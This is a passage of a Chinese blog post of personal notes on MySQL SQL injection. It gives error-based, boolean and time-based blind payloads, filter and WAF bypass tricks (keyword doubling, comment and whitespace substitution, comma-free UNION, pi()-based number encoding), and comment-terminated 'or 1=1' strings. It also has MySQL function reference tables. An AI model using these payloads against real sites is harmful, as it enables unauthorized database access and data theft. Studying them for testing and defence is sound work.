+<h4 id="join-using-注列名"><a href="#join-using-注列名" class="headerlink" title="join using 注列名"></a>join using 注列名</h4><p>通过系统关键词 join 可建立两个表之间的内连接，通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因（相同列名存在）而发生错误，并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from users a join (select * from users)b)c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username))c;</span><br><span class="line">select * from(select * from users a join (select * from users)b using(username,password))c</span><br></pre></td></tr></table></figure>
+
+<p>👴不咋懂，希望哪位SQL👴可以带带👴</p>
+<h4 id="ST-相关函数"><a href="#ST-相关函数" class="headerlink" title="ST 相关函数"></a>ST 相关函数</h4><p>MySQL 5.7</p>
+<ul>
+<li><code>select ST_LatFromGeoHash(version());</code></li>
+<li><code>select ST_LongFromGeoHash(version());</code></li>
+<li><code>select ST_PointFromGeoHash(version(),1);</code></li>
+</ul>
+<p><img src="https://i.loli.net/2021/04/26/hmOj8uBfU2PEiRq.png"></p>
+<hr>
+<h4 id="报错函数速查表"><a href="#报错函数速查表" class="headerlink" title="报错函数速查表"></a>报错函数速查表</h4><p>注：默认MYSQL_ERRMSG_SIZE=512</p>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>函数</th>
+<th>版本需求</th>
+<th>5.5.x</th>
+<th>5.6.x</th>
+<th>5.7.x</th>
+<th>8.x</th>
+<th>函数显错长度</th>
+<th>Mysql报错内容长度</th>
+<th>额外限制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>主键重复</td>
+<td>floor round</td>
+<td>❓</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td>64</td>
+<td></td>
+<td>data_type ≠ varchar</td>
+</tr>
+<tr>
+<td>列名重复</td>
+<td>name_const</td>
+<td>❓</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td>only version()</td>
+</tr>
+<tr>
+<td></td>
+<td>join</td>
+<td>[5.5.49, ?)</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td>only columns</td>
+</tr>
+<tr>
+<td>数据溢出 - Double</td>
+<td>1e308 cot exp pow</td>
+<td>[5.5.5, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>MYSQL_ERRMSG_SIZE</td>
+<td></td>
+</tr>
+<tr>
+<td>数据溢出 - BIGINT</td>
+<td></td>
+<td>[5.5.5, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>MYSQL_ERRMSG_SIZE</td>
+<td></td>
+</tr>
+<tr>
+<td>几何对象</td>
+<td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td>
+<td>[?, 5.5.48]</td>
+<td>✔️</td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td>244</td>
+<td></td>
+</tr>
+<tr>
+<td>空间函数 Geohash</td>
+<td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td>
+<td>[5.7, ?)</td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td>✔️</td>
+<td>128</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>GTID</td>
+<td>gtid_subset gtid_subtract</td>
+<td>[5.6.5, ?)</td>
+<td></td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>JSON</td>
+<td>json_*</td>
+<td>[5.7.8, 5.7.11]</td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td></td>
+<td>200</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>UUID</td>
+<td>uuid_to_bin bin_to_uuid</td>
+<td>[8.0, ?)</td>
+<td></td>
+<td></td>
+<td></td>
+<td>✔️</td>
+<td>128</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>XPath</td>
+<td>extractvalue updatexml</td>
+<td>[5.1.5, ?)</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>✔️</td>
+<td>32</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>摘自——<a target="_blank" rel="noopener" href="https://blog.sari3l.com/posts/9622f295/">Mysql 注入基础小结</a></p>
+<hr>
+<h3 id="Blind-Based"><a href="#Blind-Based" class="headerlink" title="Blind Based"></a>Blind Based</h3><h4 id="Boolean（1-or-0）"><a href="#Boolean（1-or-0）" class="headerlink" title="Boolean（1 or 0）"></a>Boolean（1 or 0）</h4><ul>
+<li><code>id=87 and length(user())&gt;0</code></li>
+<li><code>id=87 and length(user())&gt;100</code></li>
+<li><code>id=87 and ascii(mid(user(),1,1))&gt;100</code></li>
+<li><code>id=87 or ((select user()) regexp binary &#39;^[a-z]&#39;)</code></li>
+</ul>
+<h4 id="Time（无回显）"><a href="#Time（无回显）" class="headerlink" title="Time（无回显）"></a>Time（无回显）</h4><ul>
+<li><code>id=87 and if(length(user())&gt;0, sleep(10), 1)=1</code></li>
+<li><code>id=87 and if(length(user())&gt;100, sleep(10), 1)=1</code></li>
+<li><code>id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1</code></li>
+</ul>
+<h3 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h3><h4 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / or</h4><ol>
+<li>双写 anandd、oorr</li>
+<li>使用运算符代替 &amp;&amp;、||</li>
+<li>直接拼接 = 号，such as <code>?id=1=(condition)</code></li>
+<li>其他方法，such as <code>?id=1^(condition)</code></li>
+<li>大小写</li>
+<li>urlencode</li>
+</ol>
+<h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><ol>
+<li>多层空格嵌套</li>
+<li>改用 +</li>
+<li>使用注释 /**/</li>
+<li>and / or 后面可以跟上偶数个 !、~ 可以替代空格，也可以混合使用（规律又不同）</li>
+<li><code>%09, %0a, %0b, %0c, %0d, %a0</code> 等部分不可见字符可也代替空格</li>
+</ol>
+<p>such as <code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p>
+<h4 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h4><ul>
+<li>order by 大小比较盲注</li>
+</ul>
+<p>不懂QAQ，求教</p>
+<h4 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h4><ol>
+<li>改用盲注</li>
+<li><code>UNION SELECT 1,2,3</code> =&gt; <code>UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)</code></li>
+<li><code>mid(user(), 1, 1)</code> =&gt; <code>mid(user() from 1 for 1)</code></li>
+<li><code>LIMIT N, M</code> =&gt; <code>LIMIT M OFFSET N</code></li>
+</ol>
+<h4 id="其他系统关键字"><a href="#其他系统关键字" class="headerlink" title="其他系统关键字"></a>其他系统关键字</h4><ol>
+<li>双写绕过关键字过滤</li>
+<li>使用同义函数 / 语句代替，如 if 函数可用<code>case when condition then 1 else 0 end</code>语句代替</li>
+<li>大小写</li>
+<li>urlencode</li>
+</ol>
+<h4 id="单双引号被过滤-拦截-转义"><a href="#单双引号被过滤-拦截-转义" class="headerlink" title="单双引号被过滤 / 拦截 / 转义"></a>单双引号被过滤 / 拦截 / 转义</h4><ol>
+<li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入</li>
+<li>不需要跳出单引号的情况：字符串可用十六进制表示，也可通过进制转换函数表示成其他进制，汝 base_con</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">十进制转换成二进制</span><br><span class="line">select bin(5);</span><br><span class="line">十进制转换成八进制</span><br><span class="line">select oct(5);</span><br><span class="line">十进制转换成十六进制</span><br><span class="line">select hex(5);</span><br><span class="line">二进制转换成十进制</span><br><span class="line">select conv(&#39;101&#39;,2,10);</span><br><span class="line">十进制转换成十六进制</span><br><span class="line">select conv(&#39;20&#39;,10,16);</span><br><span class="line">还原十六进制</span><br><span class="line">unhex(conv(DEC_DATA,10,16))</span><br></pre></td></tr></table></figure>
+
+<h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><table>
+<thead>
+<tr>
+<th>代替字符</th>
+<th>数</th>
+<th>代替字符</th>
+<th>数</th>
+<th>字</th>
+<th>代替字符</th>
+<th>数</th>
+<th>字</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>false、!pi()</td>
+<td>0</td>
+<td>ceil(pi()*pi())</td>
+<td>10</td>
+<td>A</td>
+<td>ceil((pi()+pi())*pi())</td>
+<td>20</td>
+<td>K</td>
+</tr>
+<tr>
+<td>true、!(!pi())</td>
+<td>1</td>
+<td>ceil(pi()*pi())+true</td>
+<td>11</td>
+<td>B</td>
+<td>ceil(ceil(pi())*version())</td>
+<td>21</td>
+<td>L</td>
+</tr>
+<tr>
+<td>true+true</td>
+<td>2</td>
+<td>ceil(pi()+pi()+version())</td>
+<td>12</td>
+<td>C</td>
+<td>ceil(pi()*ceil(pi()+pi()))</td>
+<td>22</td>
+<td>M</td>
+</tr>
+<tr>
+<td>floor(pi())、~~pi()</td>
+<td>3</td>
+<td>floor(pi()*pi()+pi())</td>
+<td>13</td>
+<td>D</td>
+<td>ceil((pi()+ceil(pi()))*pi())</td>
+<td>23</td>
+<td>N</td>
+</tr>
+<tr>
+<td>ceil(pi())</td>
+<td>4</td>
+<td>ceil(pi()*pi()+pi())</td>
+<td>14</td>
+<td>E</td>
+<td>ceil(pi())*ceil(version())</td>
+<td>24</td>
+<td>O</td>
+</tr>
+<tr>
+<td>floor(version()) //注意版本</td>
+<td>5</td>
+<td>ceil(pi()*pi()+version())</td>
+<td>15</td>
+<td>F</td>
+<td>floor(pi()*(version()+pi()))</td>
+<td>25</td>
+<td>P</td>
+</tr>
+<tr>
+<td>ceil(version())</td>
+<td>6</td>
+<td>floor(pi()*version())</td>
+<td>16</td>
+<td>G</td>
+<td>floor(version()*version())</td>
+<td>26</td>
+<td>Q</td>
+</tr>
+<tr>
+<td>ceil(pi()+pi())</td>
+<td>7</td>
+<td>ceil(pi()*version())</td>
+<td>17</td>
+<td>H</td>
+<td>ceil(version()*version())</td>
+<td>27</td>
+<td>R</td>
+</tr>
+<tr>
+<td>floor(version()+pi())</td>
+<td>8</td>
+<td>ceil(pi()*version())+true</td>
+<td>18</td>
+<td>I</td>
+<td>ceil(pi()*pi()*pi()-pi())</td>
+<td>28</td>
+<td>S</td>
+</tr>
+<tr>
+<td>floor(pi()*pi())</td>
+<td>9</td>
+<td>floor((pi()+pi())*pi())</td>
+<td>19</td>
+<td>J</td>
+<td>floor(pi()*pi()*floor(pi()))</td>
+<td>29</td>
+<td>T</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;*(MySQL-5.1)</span><br><span class="line">&#x2F;**&#x2F;(一个 *&#x2F; 可以闭合前面多个&#x2F;*)</span><br><span class="line">;%00(PDO支援多語句)</span><br><span class="line">&#96;(MySQL &lt;&#x3D; 5.5)</span><br><span class="line">&#39;or 1&#x3D;1;%00</span><br><span class="line">&#39;or 1&#x3D;1 union select 1,2&#96;&#39;</span><br><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">&#39;&#x2F;*!50000or*&#x2F; 1&#x3D;1 -- -      &#x2F;&#x2F;版本号为5.1.38时只要小于50138</span><br><span class="line">&#39;&#x2F;*!or*&#x2F; 1&#x3D;1 -- -</span><br></pre></td></tr></table></figure>
+
+<h4 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h4><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><table>
+<thead>
+<tr>
+<th>运算符</th>
+<th>说明</th>
+<th>运算符</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;&amp;</td>
+<td>与，同and</td>
+<td>||</td>
+<td>或，同or</td>
+</tr>
+<tr>
+<td>!</td>
+<td>非，同not</td>
+<td>~</td>
+<td>一元比特反转</td>
+</tr>
+<tr>
+<td>^</td>
+<td>异或，同xor</td>
+<td>+</td>
+<td>加，可替代空格，如 <code>select+user()</code></td>
+</tr>
+</tbody></table>
+<h5 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h5><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>USER()</td>
+<td>获取当前操作句柄的用户名，同 SESSION_USER()、CURRENT_USER()，有时也用 SYSTEM_USER()</td>
+</tr>
+<tr>
+<td>DATABASE()</td>
+<td>获取当前选择的数据库名，同 SCHEMA()</td>
+</tr>
+<tr>
+<td>VERSION()</td>
+<td>获取当前版本信息</td>
+</tr>
+</tbody></table>
+<h5 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h5><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ORD(str)</td>
+<td>返回字符串第一个字符的ASCII值</td>
+</tr>
+<tr>
+<td>OCT(N)</td>
+<td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code></td>
+</tr>
+<tr>
+<td>HEX(N_S)</td>
+<td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式</td>
+</tr>
+<tr>
+<td>UNHEX(str)</td>
+<td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符</td>
+</tr>
+<tr>
+<td>BIN(N)</td>
+<td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式</td>
+</tr>
+<tr>
+<td>ASCII(str)</td>
+<td>同<code>ORD(string)</code></td>
+</tr>
+<tr>
+<td>CONV(N,from_base,to_base)</td>
+<td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回</td>
+</tr>
+<tr>
+<td>CHAR(N,… [USING charset_name])</td>
+<td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串</td>
+</tr>
+</tbody></table>
+<h5 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h5><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SUBSTR(str,N_start,N_length)</td>
+<td>对指定字符串进行截取，为SUBSTRING的简单版</td>
+</tr>
+<tr>
+<td>SUBSTRING()</td>
+<td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code></td>
+</tr>
+<tr>
+<td>RIGHT(str,len)</td>
+<td>对指定字符串从最右边截取指定长度</td>
+</tr>
+<tr>
+<td>LEFT(str,len)</td>
+<td>对指定字符串从最左边截取指定长度</td>
+</tr>
+<tr>
+<td>RPAD(str,len,padstr)</td>
+<td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度</td>
+</tr>
+<tr>
+<td>LPAD(str,len,padstr)</td>
+<td>与RPAD相似，在<code>str</code>左边补齐</td>
+</tr>
+<tr>
+<td>MID(str,pos,len)</td>
+<td>同于 <code>SUBSTRING(str,pos,len)</code></td>
+</tr>
+<tr>
+<td>INSERT(str,pos,len,newstr)</td>
+<td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数</td>
+</tr>
+<tr>
+<td>CONCAT(str1,str2…)</td>
+<td>函数用于将多个字符串合并为一个字符串</td>
+</tr>
+<tr>
+<td>GROUP_CONCAT(…)</td>
+<td>返回一个字符串结果，该结果由分组中的值连接组合而成</td>
+</tr>
+<tr>
+<td>MAKE_SET(bits,str1,str2,…)</td>
+<td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code></td>
+</tr>
+</tbody></table>
+<h5 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h5><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>说明</th>
+<th>变量</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>@@VERSION</td>
+<td>返回版本信息</td>
+<td>@@HOSTNAME</td>
+<td>返回安装的计算机名称</td>
+</tr>
+<tr>
+<td>@@GLOBAL.VERSION</td>
+<td>同<code>@@VERSION</code></td>
+<td>@@BASEDIR</td>
+<td>返回MYSQL绝对路径</td>
+</tr>
+</tbody></table>
+<p>可以用 <code>SHOW GLOBAL VARIABLES;</code> 查看全部全局变量</p>
+<h5 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数 / 语句"></a>其他常用函数 / 语句</h5><table>
+<thead>
+<tr>
+<th>函数/语句</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LENGTH(str)</td>
+<td>返回字符串的长度</td>
+</tr>
+<tr>
+<td>PI()</td>
+<td>返回π的具体数值</td>
+</tr>
+<tr>
+<td>REGEXP “statement”</td>
+<td>正则匹配数据，返回值为布尔值</td>
+</tr>
+<tr>
+<td>LIKE “statement”</td>
+<td>匹配数据，%代表任意内容。返回值为布尔值</td>
+</tr>
+<tr>
+<td>RLIKE “statement”</td>
+<td>与regexp相同</td>
+</tr>
+<tr>
+<td>LOCATE(substr,str,[pos])</td>
+<td>返回子字符串第一次出现的位置</td>
+</tr>
+<tr>
+<td>POSITION(substr IN str)</td>
+<td>等同于 <code>LOCATE()</code></td>
+</tr>
+<tr>
+<td>LOWER(str)</td>
+<td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code></td>
+</tr>
+<tr>
+<td>UPPER(str)</td>
+<td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code></td>
+</tr>
+<tr>
+<td>ELT(N,str1,str2,str3,…)</td>
+<td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值</td>
+</tr>
+<tr>
+<td>NULLIF(expr1,expr2)</td>
+<td>若expr1与expr2相同，则返回expr1，否则返回NULL</td>
+</tr>
+<tr>
+<td>CHARSET(str)</td>
+<td>返回字符串使用的字符集</td>
+</tr>
+<tr>
+<td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td>
+<td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code></td>
+</tr>
+</tbody></table>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="https://github.com/duitutu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">判断 column 数及回显数据字段位置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E5%BA%93%E3%80%81%E8%A1%A8%E3%80%81%E5%AD%97%E6%AE%B5"><span class="toc-number">1.1.2.</span> <span class="toc-text">爆库、表、字段</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用 overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#bigint-%E6%95%B0%E5%80%BC%E6%93%8D%E4%BD%9C"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">bigint 数值操作</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用 xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#extractvalue-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (长度限制32位)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#updatexml-%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B632%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (长度限制32位)</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99-%E4%B8%BB%E9%94%AE%E9%87%8D%E5%A4%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用虚拟表报错 &#x2F; 主键重复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%87%A0%E4%BD%95%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用几何函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用不存在的函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-name-const"><span class="toc-number">1.2.6.</span> <span class="toc-text">利用 name_const</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uuid-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.7.</span> <span class="toc-text">uuid 相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GTID-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.8.</span> <span class="toc-text">GTID 相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">1.2.9.</span> <span class="toc-text">join using 注列名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ST-%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.10.</span> <span class="toc-text">ST 相关函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E9%80%9F%E6%9F%A5%E8%A1%A8"><span class="toc-number">1.2.11.</span> <span class="toc-text">报错函数速查表</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blind-Based"><span class="toc-number">1.3.</span> <span class="toc-text">Blind Based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Boolean%EF%BC%881-or-0%EF%BC%89"><span class="toc-number">1.3.1.</span> <span class="toc-text">Boolean（1 or 0）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Time%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BE%EF%BC%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Time（无回显）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Common-Bypass"><span class="toc-number">1.4.</span> <span class="toc-text">Common Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#and-or"><span class="toc-number">1.4.1.</span> <span class="toc-text">and &#x2F; or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC"><span class="toc-number">1.4.2.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.4.3.</span> <span class="toc-text">括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%97%E5%8F%B7"><span class="toc-number">1.4.4.</span> <span class="toc-text">逗号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%B3%BB%E7%BB%9F%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.4.5.</span> <span class="toc-text">其他系统关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E8%A2%AB%E8%BF%87%E6%BB%A4-%E6%8B%A6%E6%88%AA-%E8%BD%AC%E4%B9%89"><span class="toc-number">1.4.6.</span> <span class="toc-text">单双引号被过滤 &#x2F; 拦截 &#x2F; 转义</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97"><span class="toc-number">1.4.7.</span> <span class="toc-text">数字</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-number">1.5.</span> <span class="toc-text">其它</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A"><span class="toc-number">1.5.1.</span> <span class="toc-text">注释</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">常用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">运算符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">系统信息函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">进制转换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%88%AA%E5%8F%96-%E6%8B%BC%E6%8E%A5"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">字符截取&#x2F;拼接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">1.5.2.5.</span> <span class="toc-text">常见全局变量</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0-%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.5.2.6.</span> <span class="toc-text">其他常用函数 &#x2F; 语句</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/&text=小谈SQL注入"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
